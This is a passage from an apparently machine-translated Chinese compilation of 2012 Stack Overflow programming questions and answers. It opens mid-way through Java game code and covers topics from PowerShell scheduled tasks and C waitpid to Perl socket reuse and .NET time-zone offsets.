    Image img;
    Image character;

    Coins c = new Coins(x + 500, y + 350);

    public SideScroller(String s) throws MalformedURLException, IOException {
        img = ImageIO.read(new URL("http://dl.dropbox.com/u/47632315/sideScrollerBG.png"));
        character = ImageIO.read(new URL("http://dl.dropbox.com/u/47632315/char.png"));

        f.setTitle(s);
        // don't use 'magic numbers' when descriptive constants are defined!
        //f.setDefaultCloseOperation(3);
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.setResizable(false);
        // Better to ask when loaded.
        //setPreferredSize(new Dimension(1000, 500));
        setPreferredSize(new Dimension(1000, img.getHeight(this)));
        f.add(this);
        f.pack();
        // usually harmful, rarely necessary.
//      f.setLayout(null);
        // Looks like a splash screen
        //f.setLocationRelativeTo(null);
        // located by platform default, best.
        f.setLocationByPlatform(true);
        f.addKeyListener(this);
        getKeys();

        // should be done last
        f.setVisible(true);
    }

    public void paintComponent(Graphics g) {
        super.paintComponent(g);
        g.drawImage(img, x, y, this);
        g.drawImage(character, 50, characterY, this);
        Graphics2D g2d = (Graphics2D)g;
        // here we 'translate' the graphics object to a separate location  
        g2d.translate(x,0);
        c.paint(g2d, this);
    }

    @Override
    public void keyTyped(KeyEvent e) {
    }

    @Override
    public void keyPressed(KeyEvent e) {
        int keyCode = e.getKeyCode();
        if (keyCode == KeyEvent.VK_ESCAPE) {
            System.exit(0);
        }
        if (keyCode == KeyEvent.VK_RIGHT) {
            keyPressed[0] = true;
        }
        if (keyCode == KeyEvent.VK_LEFT) {
            keyPressed[1] = true;
        }
        if (canJump) {
            if (keyCode == KeyEvent.VK_SPACE) {
                // better to use a javax.swing.Timer here
                new Thread(new Runnable() {
                    public void run() {
                        canJump = false;
                        for (double i = 0; i <= 5.1; i += .2) {
                            characterY = (int) (k * i * i - j * i + 351);
                            f.repaint();
                            System.out.println(characterY);
                            System.out.println(canJump);
                            try {
                                Thread.sleep(25);
                            } catch (InterruptedException e) {
                                System.err.println(e);
                            }
                        }
                        repaint();
                        canJump = true;
                    }
                }).start();
            }
        }
    }

    @Override
    public void keyReleased(KeyEvent e) {
        int keyCode = e.getKeyCode();
        if (keyCode == KeyEvent.VK_RIGHT) {
            keyPressed[0] = false;
        }
        if (keyCode == KeyEvent.VK_LEFT) {
            keyPressed[1] = false;
        }
    }

    public void getKeys() {
        new Thread(new Runnable() {
            public void run() {
                while (true) {
                    if (keyPressed[0]) {
                        x -= 5;
                        repaint();
                    }
                    if (keyPressed[1]) {
                        if (x != 0) {
                            x += 5;
                            repaint();
                        }
                    }
                    try {
                        Thread.sleep(25);
                    } catch (InterruptedException e) {
                        System.err.println(e);
                    }
                }
            }
        }).start();
    }
}

class Coins extends pickUpObject {

    Image coin; 

    public Coins(int x, int y) throws MalformedURLException, IOException{
        super(x, y);
        super.x = x;
        super.y = y;
        coin = ImageIO.read(new URL("http://dl.dropbox.com/u/47632315/coin.png"));
    }

    public void paint(Graphics g, ImageObserver o){
        g.drawImage(coin, x, y, o);
    }
}

abstract class pickUpObject {

    int x, y;

    public pickUpObject(int x, int y){
    }

    public abstract void paint(Graphics g, ImageObserver o);
} 
```

# powershell - 计划任务用户定义的退出代码

> ID：13328315
> 
> 赞同：1
> 
> 时间：2012-11-11T03:27:38.687
> 
> 标签：powershell, exit-code, windows-task-scheduler

这是问题所在：

我们有一个可以在我们的服务器上执行命令的远程服务器。我们有很多运行不同应用程序的服务器。我们在 powershell 的盒子上编写了脚本，这些脚本将在一个服务器一个服务器的基础上启动我们的应用程序。但是，当我们远程执行它们时，它们会在错误的用户名和密码下执行。因此，我打算在盒子上创建一个计划任务，该任务将使用正确的用户名和密码执行启动脚本。但是，他们也希望从这些脚本中获取返回值来指示成功、失败或其他情况。我知道计划任务确实有与之关联的错误代码，但我如何创建自己的并远程检索它。

问题：

是否可以远程执行计划任务并获得退出代码？

例如：schtasks /run /tn "StartupApplications"

或者您知道更好的解决方案吗？我尝试使用 powershell 凭据脚本：

```
$credential = New-Object System.Management.Automation.PSCredential $username,$password
exit ((start-process powershell -ArgumentList '-NoProfile -File "C:\Scripts\Startup.ps1"' -Credential $Credential -Wait -Passthru).ExitCode) 
```

但是我使用 ConvertFrom-SecureString 创建的密钥与我的用户名[有关该问题的信息](https://stackoverflow.com/questions/7109958/saving-credentials-for-reuse-by-powershell-and-error-convertto-securestring-ke)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T07:35:08.087

我建议使用作业而不是调度程序。

```
start-job -ScriptBlock {. "C:\Scripts\Startup.ps1"; $LASTEXITCODE} -Credential $Credential | wait-job | receive-job 
```

# security - Safety_Question - 无法确定是否证明系统是安全的

> ID：13328322
> 
> 赞同：0
> 
> 时间：2012-11-11T03:29:20.163
> 
> 标签：security, computer-science

这个问题是关于 iTunes U 安全课程第 2 讲的“安全问题”， 网址为[https://itunes.apple.com/us/itunes-u/computer-science-foundations/id389259109](https://itunes.apple.com/us/itunes-u/computer-science-foundations/id389259109)

@37:00 有证据证明证明系统安全的问题是不可判定的。争论是这个问题是不可判定的，因为保护系统精确地模拟了一个 TM，如果我们定义了一个“停止权”，那么 TM 是否会泄露“停止权”的问题是不可判定的。

“停止权”的具体例子是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T19:10:50.667

它谈到了`HRU`（Harrison-Ruzzo-Ullman）模型。

*   我们将状态表示为三重 Q=(S,O,A)

在哪里：

*S*组主题

*O*对象集

*A* -访问矩阵。

主要的访问模式是：（`read,write,append,execute and own`意味着主体是对象的所有者——这意味着他对对象具有管理员权限）。

在`HRU`（没有 Denning 的扩展）的原始论文中，非正式地，如果某个主体可以在对象 o 上获得正确的 r，则系统是不安全的（这可能是我们不希望发生的）。这称为`leak`. 正式定义说：

`a command α leaks some generic right r from configuration Q = (S, O, A), if α when run on Q, can execute the primitive operation enter r into A[s,o] which did not previously contain r.`

然后声称保护系统精确模拟了一个 TM，如果 TM 进入状态 qf（有限），那么*权利已经泄漏*，如果*安全问题可判定*，则表示 TM 并确定 qf 泄漏是否意味着*停止问题可判定*（已知为 NP - 难题）。

希望它说清楚，干杯。

# android - 从自定义 ListView JSONArray.remove(int) 中删除行 undefined

> ID：13328325
> 
> 赞同：0
> 
> 时间：2012-11-11T03:29:42.523
> 
> 标签：android, android-listview

我有一个 ListView，我使用 JSONArray 的适配器使用自定义视图填充它。在每一行中，我都有一个删除该行的按钮，但我不知道该怎么做。

```
cancel.setOnClickListener(new View.OnClickListener() {
       public void onClick(View v) {
            AlertDialog.Builder ad = new AlertDialog.Builder(context);  
            ad.setCancelable(false);
            ad.setMessage("Are you sure?");  
            ad.setPositiveButton("Ok", new DialogInterface.OnClickListener() {  
                public void onClick(DialogInterface dialog, int which) {  
                    //jsonArray.remove(position);
                }
            }); 
```

`jsonArray.remove(position)`据说`undefined for the type`和_`Cannot refer to a non-final variable position inside an inner class defined in a different method`

我的适配器的开头是这样的：

```
class JSONAdapter extends BaseAdapter implements ListAdapter {

    private final JSONArray jsonArray;
    private final LayoutInflater mInflater;
    private final Context context;
    private Button pay, cancel;

    public JSONAdapter(Context context, JSONArray jsonArray) {
        this.jsonArray = jsonArray;
        this.context = context;
        mInflater = LayoutInflater.from(context);
    } 
```

那么知道如何删除它吗？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T09:59:07.773

该类`JSONArray`没有`remove`方法，因此尝试调用它`jsonArray`显然不起作用。如果没有看到您的适配器的完整代码，我会说您有两个选择：

1.  将对象中的所有数据提取`jsonArray`到一个`ArrayList`（如果您有多个值，您可以使用一个简单的数据持有者类）并`ArrayList`在`JSONAdapter`. 然后，您可以在单击 时`Button`通过删除 中的项目轻松地从列表中删除元素`ArrayList`。

2.  您也可以`jsonArray`像现在一样使用，然后保留对已删除行数以及应删除的确切行的引用。然后在您的适配器中，您将不得不重写`getCount`and`getItem`方法以消除“已删除”行。因此，在这种情况下，您实际上不会删除行，您只会使它们显示为已删除。

我会选择选项一。

# python - 使用 lxml 提取 URL

> ID：13328329
> 
> 赞同：0
> 
> 时间：2012-11-11T03:30:17.837
> 
> 标签：python, parsing, extract, lxml

我已经将一些 HTML 抓取到一个大的 txt 文件（约 50k 行）中，并希望提取一组特定的 URL。我追求的 URL 是以下两种模式之一：

第一的

```
<div class="pic">
  <a href="https://www.site.com/joesmith"><img alt="Joe Smith" class="person_image" src="https://s3.amazonaws.com/photos.site.com/medium_jpg?12345678"></a>
</div> 
```

第二

```
<div class="name">
  <a href="https://www.site.com/joesmith">Joe Smith</a>
</div> 
```

我需要的文本是`https://www.site.com/joesmith`. 我是第一次使用 lxml，我很难把它放在一起。

这是我的代码

```
from lxml import etree
from io import StringIO

def read(filename):
  file = open(filename, 'r')
  text = file.read()
  file.close()
  out = unicode(text, errors='ignore')
  return out

def parse(filename):
  data = read(filename)
  parser = etree.HTMLParser()
  tree = etree.parse(StringIO(data), parser)
  result = etree.tostring(tree.getroot(), pretty_print=True, method='HTML')
  urls = result.findall('<div class="name">')
  return urls 
```

我已经用 findall 和 findtext 尝试了这段代码，无论哪种方式结果都是一样的，**"AttributeError: 'str' object has no attribute 'findall'"**。我已经确认 'result' 是一个带有`type()`.

我是否在正确的路径上提取 URL？我应该如何解决这个属性错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T04:19:31.713

我不确定基于 HTML 的树是否支持 XPath（我怀疑他们支持）。在那种情况下，你可以简单地做

```
urls = tree.xpath('//div[@class="pics"]/a/@href') + 
       tree.xpath('//div[@class="name"]/a/@href') 
```

# kineticjs - 当一个物体落在另一个物体上时如何检测

> ID：13328331
> 
> 赞同：0
> 
> 时间：2012-11-11T03:30:45.173
> 
> 标签：kineticjs

我正在尝试检测拖放对象。考虑在矩形内拖放圆形对象，如何从矩形中检测圆形。我不确定 kineticjs 是否为这种类型提供了事件检测器。请帮助我如何从矩形对象中检测圆形对象。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T08:18:26.463

[您可以检测与点 ( 1](http://kineticjs.com/docs/symbols/Kinetic.Container.php#getIntersections) )相交的图层中的哪些形状，这可能是该问题的最接近答案。

```
var shapes = mylayer.getIntersections(point) 
```

# c - waitpid 错误用法？

> ID：13328332
> 
> 赞同：0
> 
> 时间：2012-11-11T03:31:03.153
> 
> 标签：c, unix, exit-code, waitpid

我正在尝试从父进程访问分叉子进程的退出状态，但我得到了奇怪的答案。有时，我得到 256 或有时我得到一个负数，具体取决于我指定 &status 还是仅指定 status。我知道我真的很亲近。有人可以为我提供一点帮助，我将如何获得 EXIT_STATUS

这是我的代码

```
pid_t  pid;
int *status;
if((pid = fork()) < 0)
    fprintf(stdout, "Error forking child process\n");

else if (pid == 0)
{
    execvp(input[0], input);
    fprintf(stdout, "Invalid process!!\n");
    _exit(EXIT_FAILURE);

}
else
{
    while (waitpid(-1, status, 0) != pid);
    fprintf(stdout, "The status is %d\n", &status);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T03:32:54.337

您看到这种行为是因为您没有初始化您正在使用的指针，因此您正在调用*undefined behavior*，这意味着，从字面上看，*任何事情都*可能发生。尝试更改`status`为`int`（而不是`int*`）：

```
int status;
/* ... */
while (waitpid(-1, &status, 0) != pid);
fprintf(stdout, "The status is %d\n", status); 
```

另一方面，您的代码：

```
int * status; 
```

这会创建一个指向 int 的指针并且不会对其进行初始化。

```
while (waitpid(-1, status, 0) != pid); 
```

在这里，您将此指针传递给 waitpid()，它将写入指向的位置。由于您尚未初始化指针，因此它正在写入*未指定*的内存位置！这可能会导致进程崩溃或覆盖其他地方分配的内存，这可能会导致以后自发崩溃或数据损坏！

```
fprintf(stdout, "The status is %d\n", &status); 
```

这会打印出指针变量的地址——而不是它指向的值！使用`*status`而不是 `&status`可能允许这部分工作，但您仍在使用未初始化的指针。

我强烈建议您将编译器的警告设置调到最大值（`-Wall`使用 gcc 传递）以使其对所有内容发出警告。它会捕捉到未初始化指针的使用，并且它还可能警告您将`%d`格式说明符与指针类型值一起使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T18:12:03.557

不要使用大数或负数作为返回值，它们会混淆事物。例如，在 32 位系统上：

对于 int：255 是`0x000000ff`-1 是`0xffffffff`. 因此，如果您返回 -1 中的任何八个位块，它们都是`0xff`或 255。

如果你调用 exit(1) 或 exit(2) 或 exit(3)，或其他一些小的正数，事情对你来说会更好。在父母一定`WIFEXITED(&status)`要先打电话。

由于您似乎想使用退出状态来“告诉”您发生的问题，请尝试 sysexits：[http ://www.gsp.com/cgi-bin/man.cgi?section=3&topic=sysexits](http://www.gsp.com/cgi-bin/man.cgi?section=3&topic=sysexits)

或者简单地使用`EXIT SUCCESS`or `EXIT_FAILURE`ex: `return EXIT_SUCCESS;`or `exit(EXIT_FAILURE);` which are 保证工作 - 即，给你一个成功或失败作为回报。

# cakephp - CakePHP - 以不同的方式显示视图/元素

> ID：13328333
> 
> 赞同：0
> 
> 时间：2012-11-11T03:31:25.570
> 
> 标签：cakephp, element, reusability

我对 CakePHP 还很陌生，所以如果这是一个有点荒谬的问题，请原谅我。我已经发现，如果我想在多个页面上使用控制器，我需要使用 Elements。所以我创建了一个打印出各种信息的元素。我的问题是——什么以及如何修改元素，以便在一个页面上我可以从我的控制器中打印出值，在另一个页面上我可以将这些值放入下拉列表中。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T17:07:48.033

约定如下： 控制器包含与数据模型交互的所有操作。例如，用户控制器将通过提供登录、注销和编辑配置文件操作与用户模型进行交互。每个动作只是控制器中的一个公共方法。这些操作设置数据片段，然后在呈现 html 时使用这些数据片段。

视图是相应的模板语言和 html 片段，它们为每个动作呈现从控制器传递的数据。

布局是一种让视图不会重复太多的方式。如果您的页面具有与大多数网站类似的结构，那么使用呈现视图的布局有助于减少代码。

元素只是被重用的视图的一部分。例如，如果您的所有视图顶部都有一个标题，为方便起见，您可以将该标题代码放入一个元素中，然后简单地调用布局顶部的元素，它将在每个视图中。这也消除了代码中的重复，因为如果您需要更改该标题，您只需修改元素文件夹中的 header.ctp，而不必修改每个视图或每个布局。

# python - 在 Python 中对文件进行排序和移动

> ID：13328334
> 
> 赞同：0
> 
> 时间：2012-11-11T03:31:28.550
> 
> 标签：python

> **可能重复：**
> [PYTHON：从数组中搜索文件名，然后重新定位文件](https://stackoverflow.com/questions/13328087/python-searching-for-a-file-name-from-an-array-and-then-relocating-the-file)

我是 Python 新手，真的可以使用一些帮助。我有大量正在分类的图像。我需要每 260 张图像（例如：0、260、520、780 等）。然后我需要将这些图像重新定位到一个新文件夹。到目前为止，这是我的代码：

```
import os, os.path, sys, shutil
root = '.'
dst = "/Users/xx/Desktop/newFolder"

print "/////// F I N D__A L L__F I L E S __W I T H I N __R A N G E ///////////////////"

selectPhotos = range(260, 213921)
print selectPhotos[::260]
print "/////// L I S T__O F __A L L __J P E G S ///////////////////"

for files in os.listdir("/Users/xx/Desktop/spaceOddy/"):
   #if files.endswith(".jpg"):
     # print files

   if files.startswith(('00260', '00520', '00780')):
      print files

      #shutil.copyfile(files, "/Users/xx/Desktop")
      shutil.move ("files", dst) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:21:52.990

下面的代码实现了您正在寻找的内容。对所做更改的一些评论：

*   使用`os.rename`而不是`shutil.move`,`shutil.move`更用于递归移动目录而不是单个文件。
*   `glob`是一个很棒的模块，可以让你的代码更短，更容易阅读，而不是`os.listdir`
*   `%`每当您想对每个 x 项做某事时，模数运算符都是完美的。在您的情况下，每 260 个项目

**代码**

```
src = '/Users/xx/Desktop/spaceOddy/'
dst = "/Users/xx/Desktop/newFolder/"
EVERY = 260
for i, file in enumerate(glob.glob(src + '*.png')):
    if i % EVERY == EVERY - 1:
        print 'moving', file
        os.rename(file, dst + os.path.basename(file)) 
```

# html - 为网站和 iOS 应用程序共享 CMS

> ID：13328335
> 
> 赞同：0
> 
> 时间：2012-11-11T03:31:42.953
> 
> 标签：html, ios, wordpress, content-management-system

基本上我有一个客户想要创建一个简单的网站，该网站具有定期更新的内容和将相同信息提取到应用程序中的 iOS 应用程序。所以他们不必输入两次。

我不希望 HTML 抓取，所以我正在考虑使用 Wordpress CMS 来创建网站和他们的 API 来提取应用程序的信息。由于他们对计算机不是很了解，所以我认为这将是一个很好的解决方案。

谁能建议一个更聪明/更好的解决方案来解决这个问题？或者我是否会在使用 Wordpress 实现此功能时遇到任何问题？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:43:36.040

除了使用 ASP.NET CMS 之外，我目前正在与客户一起做完全相同的事情。我使用 AJAX/JSON 和[Node.js](http://nodejs.org/)进行通信，并使用[PhoneGap](http://phonegap.com/)创建了应用程序。

到目前为止，我还没有遇到任何问题。虽然，如果您要使用 Objective-C（纯本机）开发应用程序，我不确定您可能遇到的任何问题。

由于您使用 Wordpress，您可能还需要考虑这种方法：[https ://stackoverflow.com/a/9220135/973155](https://stackoverflow.com/a/9220135/973155)

# delphi - Delphi：向同一应用程序的运行实例发送消息，没有任何 TForm

> ID：13328344
> 
> 赞同：0
> 
> 时间：2012-11-11T03:33:16.647
> 
> 标签：delphi, sendmessage

我想知道一种方法来执行以下操作：

应用程序启动，未创建任何表单。第二个 App 实例启动，它检测到一个实例已经在运行（这已经排序）

我希望第二个实例向第一个实例发送消息，而不使用广播；我想要一种方法来找到第一个实例的句柄以直接向它发送消息。

第一个实例必须有一个类名才能找到，而第二个实例尚未创建，这样它就不会向自己发送消息。

在这种情况下我将如何使用 FindWindow？如何创建可通过 FindWindow 识别的无窗口类/对象？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T03:49:27.487

您无法通过 FindWindow 找到无窗口对象。

**但是您可以使用AllocateHWnd**函数创建不可见的窗口- 请参阅 TTimer 源代码作为示例。使用 SetWindowText 设置标题以便于搜索

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T08:37:12.037

您可以使用共享内存来传递数据。详情[请看这篇文章](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366551%28v=vs.85%29.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T19:01:09.873

如果您知道窗口属性`TApplication`的值，您可以向窗口发送消息。`Title`发送实例可以暂时将自己的值设置`Title`为不同的值，以免混淆`FindWindow()`。接收实例可以使用`TApplication.OnMessage`事件或`TApplication.HookMainWindow()`方法来接收消息。

# perl - 如何将 AnyEvent::Handler 与具有端口重用的套接字一起使用

> ID：13328346
> 
> 赞同：4
> 
> 时间：2012-11-11T03:33:42.403
> 
> 标签：perl, sockets, event-driven, anyevent

最近我遇到了一个很棒的 perl 模块“AnyEvent”，它允许用户进行异步/事件驱动的编程。

创建了以下代码片段，它工作正常。我遇到的问题是，在它打开和关闭大量套接字后，它很快耗尽了所有客户端端口（“netstat -ant”显示 20,000 多个套接字处于 TIME_WAIT 状态）。

```
$hdl = new AnyEvent::Handle (
  connect => [$ip, $port],
  on_connect=> sub {
      my ($handle, $host, $port, $tmp) = @_;
      #print "connect routine for $handle->{ue}\r\n";
      #update states.
  },
  on_read => sub {
      my $hdl = $_[0];
      #read data
      #send response.
  }); 
```

我想知道是否可以使用 IO::Socket::INET 创建 TCP 套接字，然后在 AnyEvent::Handle 中使用新创建的套接字：

```
my $sock = IO::Socket::INET->new( Proto    => 'tcp',
                             PeerAddr => $ue->{vars}->{ip},
                             PeerPort => $ue->{vars}->{dstPort},
                             ReusePort => 1,
            KeepAlive => 1
) || die "failed to setup outsock $@\n";
$hdl = new AnyEvent::Handle (
  fh => $sock,
  on_connect=> sub {
      my ($handle, $host, $port, $tmp) = @_;
      #print "connect routine for $handle->{ue}\r\n";
      #update states.
  },
  on_read => sub {
      my $hdl = $_[0];
      #read data
      #send response.
  }); 
```

试过了，但它不起作用。感谢任何建议/意见。

感谢 ikegami 对此进行了调查并提出了建议。但是，似乎 SO_REUSEADDR 没有生效。这是我使用的代码（基于他的建议）

```
use strict;
use warnings;

use AnyEvent           qw( );
use AnyEvent::Handle   qw( );
use AnyEvent::Impl::EV qw( );
use AnyEvent::Socket   qw( tcp_connect );
use Socket             qw( SOL_SOCKET SO_REUSEPORT SO_REUSEADDR);

my $ts = 0;
my $trans = 0;
my $currentTS;

sub transaction {
   my ($host, $port) = @_;
   tcp_connect($host, $port, sub {
      my ($sock) = @_
         or die "Can't connect: $!";

      my $handle;
      $handle = AnyEvent::Handle->new(
         fh => $sock,
         on_eof => sub {
            $handle->destroy();
         },
         on_read => sub {
            my ($handle) = @_;
            #print $handle->rbuf();
            $trans ++;
            $currentTS = time();
            if ($currentTS > $ts) {
                $ts = $currentTS;
                print "$trans\n";
            }
            #printf "recved %d bytes of data\n", length($handle->rbuf);
            # This should continue to read until header +
            # Content-Length bytes have been read instead
            # of stopping after one read.
            if (length($handle->rbuf) > 0) {
                $handle->destroy();
            }
         },
      );
      $handle->push_write("GET /s HTTP/1.1\r\nHost: $host\r\n\r\n");
      #$handle->push_shutdown();  # Done writing.
   }, sub {
      my ($sock) = @_;

      #setsockopt($sock, SOL_SOCKET, SO_REUSEPORT, 1) or die $!;
      setsockopt($sock, SOL_SOCKET, SO_REUSEADDR, 1)  or die $!;
        #   die "failed to set linger $!\n";
      return undef;
   });
}
{
   my $cv = AnyEvent->condvar();

   my $t = AnyEvent->timer(after=>0.001, interval=>1, cb=> sub {
      transaction("10.3.0.6", 80 );
   });

   $cv->recv();
} 
```

我的系统是 Ubuntu 11.04。在目录 /proc/sys/net/ipv4 中，以下是两个文件的内容：

> % 更多 tcp_tw_recycle
> 
> > 1
> 
> % 更多 tcp_tw_reuse
> 
> > 1

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T10:19:51.653

我无法运行以下内容，因为 Windows 不提供`SO_REUSEPORT`，但我非常有信心以下内容可以满足您的要求。

也就是说，我不确定它是否会有所帮助。根据我的阅读，`SO_REUSEPORT`允许您绑定到已经活动的端口，但您没有绑定到任何端口。

```
use strict;
use warnings;

use AnyEvent           qw( );
use AnyEvent::Handle   qw( );
use AnyEvent::Impl::EV qw( );
use AnyEvent::Socket   qw( tcp_connect );
use Socket             qw( SOL_SOCKET SO_REUSEPORT ); 
```

```
sub transaction {
   my ($host, $port) = @_;
   tcp_connect($host, $port, sub {
      my ($sock) = @_
         or die "Can't connect: $!";

      my $handle;
      $handle = AnyEvent::Handle->new(
         fh => $sock,
         on_eof => sub {
            $handle->destroy();
         },
         on_read => sub {
            my ($handle) = @_;
            print $handle->rbuf();

            # This should continue to read until header +
            # Content-Length bytes have been read instead
            # of stopping after one read.
            $handle->destroy();
         },
      );

      $handle->push_write("GET / HTTP/1.1\r\nHost: $host\r\n\r\n");
      $handle->push_shutdown();  # Done writing.
   }, sub {
      my ($sock) = @_;

      setsockopt($sock, SOL_SOCKET, SO_REUSEPORT, 1)
         or die $!;

      return undef;
   });
} 
```

```
{
   my $cv = AnyEvent->condvar();

   my $t = AnyEvent->timer(after=>0.001, interval=>0.001, cb=> sub {
      transaction("localhost", $ARGV[0] // die("usage"));
   });

   $cv->recv();
} 
```

用于测试的服务器：

```
use strict;
use warnings;
use 5.010;

use IO::Socket::INET qw( );
use Socket           qw( inet_ntoa );

my $serv = IO::Socket::INET->new(
   Listen => 1,
);

say inet_ntoa($serv->sockaddr) . ":" . $serv->sockport;

while (my $client = $serv->accept()) {
   say "Connection from ".inet_ntoa($client->peeraddr).":".$client->peerport;
   while (<$client>) {
      last if /^(?:\r?\n)?\z/;
   }

   say $client "HTTP/1.1 200 OK\r\n"
      .        "Content-Type: text/plain\r\n"
      .        "\r\n"
      .        "Hello\n";

   say "   done.";
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-09T05:28:20.597

您正在做的事情无法使用 TCP/IP 完成 - 发生的情况是您正在运行一种保护机制（TIME_WAIT 状态），该机制确保 (srcip, srcport, dstip, dstport) 元组不再使用。REUSEADDR、REUSEPORT 和 IO::Socket 在这里都无济于事——这是一个协议限制。

唯一合法的出路是不要太快地创建相同的元组，例如，通过使用不同的源 IP 地址或重用现有的 tcp 连接来进行更多事务。甚至使用多个目标端口或 IP 地址——任何使元组更“独特”的东西都会有所帮助。

如果你很绝望，你可以在你的操作系统中启用不安全的端口重用，但这会带来数据损坏的真正危险，所以当涉及到其他人的数据时不要这样做:)

据我所见，ikegamis 示例片段非常好，很好地展示了如何从 IO::Socket “导入”套接字，以及如何使用 tcp_connect 绑定套接字。如果您选择使用多个源 IP 地址，那么他的代码会显示如何绑定到它们。

# c# - 如何在 .NET 中的 DST 时间获取 UTC 偏移量

> ID：13328349
> 
> 赞同：7
> 
> 时间：2012-11-11T03:33:55.550
> 
> 标签：c#, .net, datetime, utc, dst

我试图在一个时区中看到所有偏移量，在一个时间间隔内。下面是我用来完成此操作的函数，我知道您可以在标准时间使用`TimeZoneInfo.BaseUtcOffset`获取`UTC offset`时区，但是在夏令时没有类似的方法来获取时区，除非您将特定`DST`时间点传递给该`GetUTCOffset()`方法.

```
static void GetOffsets(DateTime startTime, DateTime endTime, TimeZoneInfo tz)
{
    var result = new HashSet<int>();
    var adjRules = tz.GetAdjustmentRules();
    result.Add(tz.BaseUtcOffset);

    foreach (var adjustmentRule in adjRules)
    {
        if ((startTime >= adjustmentRule.DateStart && startTime <= adjustmentRule.DateEnd) || (endTime >= adjustmentRule.DateStart && endTime <= adjustmentRule.DateEnd) ||
             (stTime <= adjustmentRule.DateStart && endTime >= adjustmentRule.DateEnd))
        {
            if(adjustmentRule.DaylightDelta != TimeSpan.Zero)
            {
                if (!result.Contains(tz.BaseUtcOffset + adjustmentRule.DaylightDelta))
                      result.Add((tz.BaseUtcOffset + adjustmentRule.DaylightDelta));
            }
         }
     }

     foreach (var res in result)
     {
         Console.WriteLine(res);
     }
} 
```

请让我知道是否有更好的方法来做到这一点。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T15:34:12.903

> 我试图在一个时区中看到所有偏移量，在一个时间间隔内。

我*强烈*建议您避免尝试`TimeZoneInfo`直接使用。在某些年份，某些区域的调整规则可能会令人惊讶地尴尬，正如我发现的那样。

虽然我有偏见，但我建议使用[Noda Time](http://noda-time.googlecode.com)，它可以包装 a`TimeZoneInfo`并通过`BclDateTimeZone.FromTimeZoneInfo`. 您的问题在要求方面并不完全清楚，但是如果您可以多说一点您要做什么，我可以为您编写适当的 Noda Time 代码。

您的初始描述可以通过以下方式实现：

```
public IEnumerable<ZoneInterval> GetZoneIntervalsInInterval
    (this DateTimeZone zone, Interval interval)
{
    Instant current = interval.Start;
    while (current < interval.End && current != Instant.MaxValue)
    {
        ZoneInterval zi = zone.GetZoneInterval(current);
        yield return zi;
        current = zi.End;
    }
} 
```

然后：

```
var zone = BclDateTimeZone.FromTimeZoneInfo(tzInfo);
var offsets = zone.GetZoneIntervalsInInterval(interval)
                  .Select(zi => zi.WallOffset)
                  .Distinct(); 
```

那是假设您与我所说的“偏移量”意思相同（即UTC与本地时间之间的差异）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T15:04:09.180

我确实想出了这种方法来获取指定时区信息的一年间隔内的UTC间隔需要考虑的偏移量。我将此集合传递给数据库以过滤保存在 UTC 中的日期时间字段，以获取间隔过滤器输入，例如（“1am - 2am”），我确实为我系统中的所有时区测试了这个，它工作正常。虽然这不是我最初问题的答案，因为我仍在使用调整规则来获取偏移量，但这次我试图让它可用。

```
class Program
{
    static void Main(string[] args)
    {
        foreach (var tz in TimeZoneInfo.GetSystemTimeZones())
        {
            var result = GetUTCOffsetsByUTCIntervals(1900, 2012, tz);
            Console.WriteLine(tz.DisplayName);
            foreach (var tuple in result)
            {
                Console.WriteLine(tuple.Item1 + "     " + tuple.Item2 + "   " + tuple.Item3);
            }
            Console.WriteLine("------------------------------------------------------------");
        }
        Console.Read();
    }

    public static List<Tuple<TimeSpan, DateTime, DateTime>> GetUTCOffsetsByUTCIntervals(int stYear, int endYear, TimeZoneInfo tz)
    {
        var cal = CultureInfo.CurrentCulture.Calendar;
        var offsetsByUTCIntervals = new List<Tuple<TimeSpan, DateTime, DateTime>>();
        var adjRules = tz.GetAdjustmentRules();
        for (var year = stYear; year <= endYear && year < DateTime.MaxValue.Year && year >= DateTime.MinValue.Year; year++)
        {
            var adjRule =
                adjRules.FirstOrDefault(
                    rule =>
                    rule.DateStart.Year == year || rule.DateEnd.Year == year ||
                    (rule.DateStart.Year < year && rule.DateEnd.Year > year));

            var yrStTime = new DateTime(year, 1, 1);
            var yrEndTime = yrStTime.AddYears(1).AddTicks(-1);

            if (adjRule != null)
            {
                var tStDate = GetTransitionDate(adjRule.DaylightTransitionStart, year);
                var tEnddate = GetTransitionDate(adjRule.DaylightTransitionEnd, year);

                var stTsp = adjRule.DaylightTransitionStart.TimeOfDay.TimeOfDay;

                var endTsp = adjRule.DaylightTransitionEnd.TimeOfDay.TimeOfDay;

                if (yrStTime.Date == tStDate && yrStTime.TimeOfDay == stTsp)
                    yrStTime = yrStTime.Add(adjRule.DaylightDelta);

                if (yrEndTime.Date == tEnddate && yrEndTime.TimeOfDay == endTsp)
                    yrEndTime = yrEndTime.Subtract(adjRule.DaylightDelta);

              if (tStDate.Month > tEnddate.Month)
                {
                    offsetsByUTCIntervals.Add(new Tuple<TimeSpan, DateTime, DateTime>(tz.BaseUtcOffset + adjRule.DaylightDelta, ConvertTimeToUtc(yrStTime, tz), ConvertTimeToUtc(tEnddate.AddTicks(endTsp.Ticks - 1), tz)));
